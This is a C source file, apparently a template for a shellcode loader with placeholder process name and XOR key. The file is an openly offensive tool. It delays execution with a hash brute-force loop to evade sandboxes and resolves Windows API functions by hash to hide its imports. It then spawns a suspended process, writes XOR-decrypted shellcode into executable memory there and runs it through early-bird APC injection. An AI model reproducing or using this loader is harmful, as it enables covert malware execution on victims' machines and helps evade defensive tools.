#include "Shellcode.h"
/*
Externally defined shellcode variables:

{
    unsigned char shellcode[];
    unsigned int shellcode_size;
}

*/

#include "Xor.h"
/*
Externally defined xorShellcode function:

{
    void xorShellcode(unsigned char *shellcode, unsigned int shellcode_size, unsigned char key);
}

*/

#include "Iat.h"
/*
Externally defined IAT variables:

{
    FARPROC AddrFromHash( HMODULE hLib, uint64_t hashval, uint64_t seed );
}

*/

#include "Hash.h"
/*
Externally defined Hash function:

{
    uint64_t Hash( const char *str, uint64_t seed );
}

*/


#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <windows.h>

void incr( char *str ) {
    int index = 0;
    while ( str[index] != '\0' ) {
        if ( str[index] < 'z' ) {
            str[index]++;
            break;
        } else {
            str[index] = 'a';
            index++;
        }
    }
    if ( str[index] == '\0' && index < 8 ) {
        str[index] = 'a';
        str[index + 1] = '\0';
    }
}

int main( int argc, char *argv[] ) {

    typedef struct {
        BOOL( *CreateProcessA )
        ( LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles,
          DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFO lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation );

        LPVOID( *VirtualAllocEx )
        ( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect );

        BOOL( *WriteProcessMemory )
        ( HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten );

        DWORD( *QueueUserAPC )
        ( PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData );

        DWORD( *ResumeThread )
        ( HANDLE hThread );

        DWORD( *WaitForSingleObject )
        ( HANDLE hHandle, DWORD dwMilliseconds );

        BOOL( *CloseHandle )
        ( HANDLE hObject );

        BOOL( *VirtualFreeEx )
        ( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType );

    } Overwat;

    /*
        CreateProcessA -> 0x215613a9e
        VirtualAllocEx -> 0x44fc51c32
        WriteProcessMemory -> 0x593b94aae
        QueueUserAPC -> 0x45688564c
        ResumeThread -> 0x24b52292
        WaitForSingleObject -> 0xd8670435
        CloseHandle -> 0x2fba412b3
        VirtualFreeEx -> 0x48238ac7f
        zzazzl -> 0x40ba6a2ed
    */

    /* Sandbox Evasion */
    printf( "[*] Beginning bruteforce routine... \n" );

    const uint64_t test = 0x6368b82f2;

    const uint64_t seed = 5;
    const int timeout = 40;

    char attempt[9] = "a";

    time_t start_time, current_time;
    time( &start_time );

    while ( strlen( attempt ) <= 8 ) {
        uint64_t attempt_hash = Hash( attempt, seed );

        if ( attempt_hash == test ) {
            printf( "OK -> %s\n", attempt );

            int elapsed_time = difftime( current_time, start_time );
            printf( "[!!!] Elapsed time: %d seconds\n", elapsed_time );
            printf( " [+] Beginning execution now. :) " );
            break;
        }
        incr( attempt );

        time( &current_time );
        if ( difftime( current_time, start_time ) > timeout ) {
            printf( "Timeout reached, for some reason it wasn't cracked lol\n" );
            char user_input[10];
            printf( "Enter the correct plaintext (up to 10 characters): " );
            scanf_s( "%10s", user_input, (unsigned)_countof( user_input ) );
            // Default: zzzza -> 0x6368b82f2

            if ( Hash( user_input, seed ) == test ) {
                printf( "OK -> %s\n", user_input );
                break;
            } else {
                printf( "Incorrect.\n" );
                return 1;
            }

            return 0;
        }
    }

    /* Resolving WinAPI Functions */

    HMODULE hLib = LoadLibraryA( "kernel32.dll" );
    if ( hLib == NULL ) {
        printf( "Failed to load kernel32.dll\n" );
        return 1;
    }
    uint64_t hashes[] = {
        0x215613a9e, 0x44fc51c32, 0x593b94aae, 0x45688564c, 0x24b52292, 0xd8670435, 0x2fba412b3, 0x48238ac7f };

    Overwat w;

    w.CreateProcessA = (BOOL( * )( LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFO, LPPROCESS_INFORMATION ))AddrFromHash( hLib, hashes[0], seed );

    if ( w.CreateProcessA == NULL ) {
        printf( "Failed to resolve hash: %llx\n", hashes[0] );
        return 1;
    }

    w.VirtualAllocEx = (LPVOID( * )( HANDLE, LPVOID, SIZE_T, DWORD, DWORD ))AddrFromHash( hLib, hashes[1], seed );

    if ( w.VirtualAllocEx == NULL ) {
        printf( "Failed to resolve hash: %llx\n", hashes[1] );
        return 1;
    }

    w.WriteProcessMemory = (BOOL( * )( HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T * ))AddrFromHash( hLib, hashes[2], seed );

    if ( w.WriteProcessMemory == NULL ) {
        printf( "Failed to resolve hash: %llx\n", hashes[2] );
        return 1;
    }

    w.QueueUserAPC = (DWORD( * )( PAPCFUNC, HANDLE, ULONG_PTR ))AddrFromHash( hLib, hashes[3], seed );

    if ( w.QueueUserAPC == NULL ) {
        printf( "Failed to resolve hash: %llx\n", hashes[3] );
        return 1;
    }

    w.ResumeThread = (DWORD( * )( HANDLE ))AddrFromHash( hLib, hashes[4], seed );

    if ( w.ResumeThread == NULL ) {
        printf( "Failed to resolve hash: %llx\n", hashes[4] );
        return 1;
    }

    w.WaitForSingleObject = (DWORD( * )( HANDLE, DWORD ))AddrFromHash( hLib, hashes[5], seed );

    if ( w.WaitForSingleObject == NULL ) {
        printf( "Failed to resolve hash: %llx\n", hashes[5] );
        return 1;
    }

    w.CloseHandle = (BOOL( * )( HANDLE ))AddrFromHash( hLib, hashes[6], seed );

    if ( w.CloseHandle == NULL ) {
        printf( "Failed to resolve hash: %llx\n", hashes[6] );
        return 1;
    }

    w.VirtualFreeEx = (BOOL( * )( HANDLE, LPVOID, SIZE_T, DWORD ))AddrFromHash( hLib, hashes[7], seed );

    if ( w.VirtualFreeEx == NULL ) {
        printf( "Failed to resolve hash: %llx\n", hashes[7] );
        return 1;
    }

    FreeLibrary( hLib );

    printf( "[+] Successfully resolved %zu hashes\n", sizeof( hashes ) / sizeof( hashes[0] ) );

    /* Begin execution now. */

    printf( "[!!!] Beginning loader routine now. \n\n" );

    STARTUPINFO si = { sizeof( si ) };
    PROCESS_INFORMATION pi = { 0 };
    LPCSTR target = "${ PNAME }";

    printf( "[-] Tasked to spawn: %s\n", target );

    if ( !w.CreateProcessA( target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi ) ) {
        printf( "[-] Task 1: failed with error code %d. Unable to create the process.\n", GetLastError() );
        return 1;
    }
    printf( "[+] OK: PID %d\n", pi.dwProcessId );

    printf( "[-] Tasked to allocate memory to PID: %d\n", pi.dwProcessId );
    LPVOID lpBaseAddress = w.VirtualAllocEx( pi.hProcess, NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
    if ( lpBaseAddress == NULL ) {
        printf( "[-] Task 2: failed with error code %d. Unable to allocate memory in the target process.\n", GetLastError() );
        w.CloseHandle( pi.hProcess );
        w.CloseHandle( pi.hThread );
        return 1;
    }

    printf( "[+] OK: Address %p\n", lpBaseAddress );

    printf( "[-] Beginning decryption routine" );

    xorShellcode( shellcode, shellcode_size, "${ KEY }" );

    printf( "[+] Shellcode decryption complete.\n" );

    printf( "[-] Tasked to write shellcode to allocated memory in the target process...\n" );
    if ( !w.WriteProcessMemory( pi.hProcess, lpBaseAddress, shellcode, shellcode_size, NULL ) ) {
        printf( "[-] Task 3: failed with error code %d. Unable to write to the allocated memory.\n", GetLastError() );
        w.VirtualFreeEx( pi.hProcess, lpBaseAddress, 0, MEM_RELEASE );
        w.CloseHandle( pi.hProcess );
        w.CloseHandle( pi.hThread );
        return 1;
    }
    printf( "[+] OK: Wrote %zu bytes to %p.\n", shellcode_size, lpBaseAddress );

    printf( "[+] Queuing APC to the target thread...\n" );
    if ( !w.QueueUserAPC( (PAPCFUNC)lpBaseAddress, pi.hThread, NULL ) ) {
        printf( "[-] Task 4: failed with error code %d. Unable to queue the APC.\n", GetLastError() );
        w.VirtualFreeEx( pi.hProcess, lpBaseAddress, 0, MEM_RELEASE );
        w.CloseHandle( pi.hProcess );
        w.CloseHandle( pi.hThread );
        return 1;
    }
    printf( "[+] Successfully queued an APC to address %p.\n", lpBaseAddress );

    printf( "[+] Resuming the suspended thread (Thread ID: %d) in the target process...\n", pi.dwThreadId );
    w.ResumeThread( pi.hThread );
    printf( "[+] Thread resumed.\n" );

    printf( "[+] Waiting for the target process to exit...\n" );
    w.WaitForSingleObject( pi.hProcess, INFINITE );
    printf( "[+] Process with PID %d exited.\n", pi.dwProcessId );

    w.CloseHandle( pi.hProcess );
    w.CloseHandle( pi.hThread );

    printf( "[+] Process and thread handles closed. Exiting...\n" );
    return 0;
}